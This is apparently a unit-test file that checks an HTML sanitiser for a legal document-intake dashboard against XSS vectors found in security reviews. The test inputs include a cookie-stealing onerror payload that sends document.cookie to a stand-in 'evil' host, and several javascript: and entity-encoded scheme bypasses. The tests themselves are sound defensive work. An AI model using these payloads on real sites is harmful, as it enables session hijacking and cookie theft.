/**
 * Unit Tests — sanitiseHtml (src/api/routes/employment-intake.ts)
 *
 * This is the shared last-line-of-defense on every generated document
 * rendered in the dashboard via dangerouslySetInnerHTML. The 2026-07-14
 * security review found it passed unquoted event handlers and javascript:
 * URIs; these tests lock the closed vectors, including the exact payload
 * that could reach it through the public intake portal.
 */

import { describe, it, expect } from 'vitest';
import { sanitiseHtml } from '../../src/api/routes/employment-intake.js';

describe('sanitiseHtml — active-content stripping', () => {
  it('strips quoted event handlers', () => {
    expect(sanitiseHtml('<div onclick="steal()">x</div>')).not.toMatch(/onclick/i);
  });

  it('strips UNQUOTED event handlers (the review finding)', () => {
    const out = sanitiseHtml('<img src=x onerror=fetch("//evil/"+document.cookie)>');
    expect(out).not.toMatch(/onerror/i);
  });

  it('strips single-quoted event handlers', () => {
    expect(sanitiseHtml("<svg onload='alert(1)'>")).not.toMatch(/onload/i);
  });

  it('removes script, iframe, object, embed tags', () => {
    expect(sanitiseHtml('<script>alert(1)</script>')).not.toMatch(/<script/i);
    expect(sanitiseHtml('<iframe src="//evil"></iframe>')).not.toMatch(/<iframe/i);
    expect(sanitiseHtml('<object data="x"></object>')).not.toMatch(/<object/i);
    expect(sanitiseHtml('<embed src="x">')).not.toMatch(/<embed/i);
  });

  it('neutralizes javascript: and data: URIs in href/src', () => {
    expect(sanitiseHtml('<a href="javascript:alert(1)">x</a>')).not.toMatch(/javascript:/i);
    expect(sanitiseHtml('<a href=javascript:alert(1)>x</a>')).not.toMatch(/javascript:/i);
    expect(sanitiseHtml('<img src="data:text/html,<script>">')).not.toMatch(/data:text\/html/i);
  });

  it('neutralizes the exact intake-portal payload against the mediation-brief title', () => {
    // A client-controlled last name submitted through the public portal.
    const lastName = 'Smith<img src=x onerror=fetch("//evil/"+document.cookie)>';
    const title = `<h1>Mediation Brief of the Plaintiff, Dana ${lastName}</h1>`;
    const out = sanitiseHtml(title);
    expect(out).not.toMatch(/onerror/i);
  });

  it('preserves legitimate generated markup', () => {
    const doc = '<h1>Brief</h1>\n<h2>Overview</h2>\n<p>1.&nbsp;&nbsp;Facts.</p>\n<table><tr><th>A</th><td>B</td></tr></table>';
    const out = sanitiseHtml(doc);
    expect(out).toContain('<h1>Brief</h1>');
    expect(out).toContain('<table>');
    // sanitize-html decodes entities, so &nbsp; arrives as a literal
    // non-breaking space. That decoding is REQUIRED, not incidental: it is
    // what lets the scheme check see through java&#115;cript: (verified —
    // with decoding disabled that payload survives). U+00A0 renders and
    // exports identically to the entity, so nothing is lost.
    expect(out).toContain('<p>1.\u00a0\u00a0Facts.</p>');
  });
});

describe('allowlist regressions (2026-08-04 review: blacklist bypasses)', () => {
  // Each of these survived the previous regex blacklist. They are the reason
  // it was replaced rather than patched: the handler rules all required
  // literal whitespace before the attribute, and the tag rule named only a
  // handful of elements.
  it('strips a handler with no whitespace before it', () => {
    const out = sanitiseHtml('<p><img src="x"onerror="alert(1)"></p>');
    expect(out).not.toMatch(/onerror/i);
    expect(out).not.toMatch(/<img/i);
  });

  it('strips handlers separated by a slash', () => {
    expect(sanitiseHtml('<p><details/open/ontoggle=alert(1)></p>')).not.toMatch(/ontoggle/i);
  });

  it('blocks an entity-encoded javascript scheme', () => {
    expect(sanitiseHtml('<a href="java&#115;cript:alert(1)">x</a>')).not.toMatch(/javascript:/i);
    expect(sanitiseHtml('<a href="javascript&colon;alert(1)">x</a>')).not.toMatch(/javascript/i);
  });

  it('blocks a javascript URL containing a quote or space', () => {
    expect(sanitiseHtml(`<a href="javascript:alert('x')">x</a>`)).not.toMatch(/javascript:/i);
    expect(sanitiseHtml('<a href="javascript: alert(1)">x</a>')).not.toMatch(/javascript:/i);
  });

  it('drops tags the old blacklist never named', () => {
    for (const markup of ['<img src=x>', '<svg><circle/></svg>', '<form action="//evil"></form>', '<video src=x>']) {
      const out = sanitiseHtml(markup);
      expect(out).not.toMatch(/<(img|svg|form|video)/i);
    }
  });

  it('refuses anything not on the allowlist by default', () => {
    // The point of an allowlist: a vector nobody thought of is still refused.
    expect(sanitiseHtml('<marquee onstart=alert(1)>x</marquee>')).not.toMatch(/<marquee|onstart/i);
    expect(sanitiseHtml('<math><mtext></mtext></math>')).not.toMatch(/<math/i);
  });

  it('keeps the markup court documents actually use', () => {
    const doc = '<h1>Statement of Claim</h1>'
      + '<ol start="7" class="numbered"><li>Paragraph seven.</li></ol>'
      + '<table><thead><tr><th scope="col">Head</th></tr></thead>'
      + '<tbody><tr><td colspan="2">Amount</td></tr></tbody></table>'
      + '<p class="numbered">Numbered paragraph.</p>'
      + '<a href="https://ontariocourtforms.on.ca">Form 14A</a>';
    const out = sanitiseHtml(doc);
    expect(out).toContain('start="7"');          // pleading numbering survives
    expect(out).toContain('class="numbered"');    // court-format CSS hook
    expect(out).toContain('scope="col"');
    expect(out).toContain('colspan="2"');
    expect(out).toContain('<h1>Statement of Claim</h1>');
    expect(out).toContain('href="https://ontariocourtforms.on.ca"');
  });
});
